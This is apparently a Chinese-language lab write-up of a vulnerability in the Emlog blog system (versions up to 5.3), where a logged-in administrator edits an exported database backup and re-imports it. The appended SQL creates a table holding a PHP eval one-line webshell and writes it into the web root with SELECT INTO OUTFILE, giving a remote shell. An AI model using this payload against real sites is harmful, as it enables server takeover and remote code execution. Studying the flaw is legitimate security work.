## Emlog简介

Emlog是“Every Memory
Log”的简介，意即：点滴记忆。它是一款基于PHP语言MYSQL数据库的开源、免费、功能强大的个人或多人联合撰写的博客系统（Blog）。基于PHP和MYSQL的功能强大的博客以及CMS建站系统。致力于提供快速、稳定，且在使用上又及其简单、舒适的博客服务。安装和使用都非常方便。目前Emlog正在受到越来越多的广大用户的青睐。

## 漏洞分析

影响版本：Emlog<=5.3

前提条件：用户可以实现登录后台

漏洞说明：Emlog提供了数据库的备份与导入功能，导致用户可以备份系统中的数据库到本地，同时用户可以将之前备份的数据库导入到系统中，系统对于用户导入的数据库只是做了是否与当前Emlog系统版本一致的验证，以及数据库前缀的验证，并未对其他的内容进行验证，而且每次将备份的数据库导入到原来的系统中时，系统会自动的更新一次操作以便于实现数据的同步，但是也因为以上的方便给予了用户可利用的点，用户可以将数据库备份到本地，之后修改备份的数据库，构造自己的sql语句，之后再将数据库导入到原有的系统中实现getshell！在emlog\src\admin\data.php中给出了数据库的备份以及数据库的导入功能的代码！

## 漏洞复现

![](https://image.3001.net/images/20230806/1691251261_64ce723df322ea08765fb.png!small)

登陆站点即可进行管理站点，登录名密码都给了，为root/123456

所以这里直接查看管理部分，因为漏洞为数据库备份恢复漏洞，所以大致可以猜测出来站点可以导出sql文件并且恢复sql文件，由此可以知道，可以在sql文件中拼接我们写入的sql语句并getshell。

![](https://image.3001.net/images/20230806/1691251310_64ce726e69f11653c8598.png!small)

先进行备份数据，会导出sql文件，编辑文件，在最后添加代码

    
    
    drop table if exists emlog_shell;// 如果存在emlog_shell表就把它删了;
    create table emlog_shell( `cmd` longtext not null);// 重新创建一张表emlog_shell，而且只有字段cmd;
    insert into emlog_shell values ( "<?php @eval($_POST[cmd]);?>");// longtext类型且不为空，并且插入字段值，构成一句话木马;
    select cmd from emlog_shell into outfile '/var/www/html/m0re.php';// 然后将cmd的值读出来outfle文件输出流输出到/var/www/html/m0re.php
    drop table if exists emlog_shell;// emlog_shell表删了

![](https://image.3001.net/images/20230806/1691251430_64ce72e671094e22d6860.png!small)

重新导入该sql文件

![](https://image.3001.net/images/20230806/1691251449_64ce72f98843eb089d97b.png!small)成功导入

![](https://image.3001.net/images/20230806/1691251461_64ce730593726d31b5407.png!small)可以连接一下shell，然后找到正确的key

![](https://image.3001.net/images/20230806/1691251560_64ce7368b1eff6e8961b0.png!small)

一次简单的实验结束，与大家共同学习！

